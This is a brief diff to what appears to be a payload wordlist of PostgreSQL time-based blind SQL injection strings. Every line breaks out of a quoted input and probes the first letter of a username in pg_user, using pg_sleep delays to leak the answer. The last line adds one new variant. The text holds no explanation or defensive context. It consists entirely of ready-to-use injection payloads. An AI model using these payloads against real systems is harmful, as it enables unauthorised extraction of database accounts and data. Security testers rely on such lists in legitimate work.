@@ -1,4 +1,4 @@
 1' AND (SELECT CASE WHEN (SUBSTRING(usename FROM 1 FOR 1) = 'a') THEN TRUE ELSE FALSE END FROM pg_user LIMIT 1 OFFSET 0) AND pg_sleep(3)-- 
 1' AND (SELECT CASE WHEN SUBSTRING(usename FROM 1 FOR 1) = 'a' THEN TRUE ELSE FALSE END FROM pg_user LIMIT 1 OFFSET 0) = TRUE AND pg_sleep(3)-- 
 1' AND EXISTS (SELECT 1 FROM pg_user WHERE SUBSTRING(usename,1,1) = 'a') AND pg_sleep(10)-- 
-
+1' AND (SELECT pg_sleep(3) FROM pg_user WHERE SUBSTRING(usename,1,1) = 'a') IS NOT NULL-- 
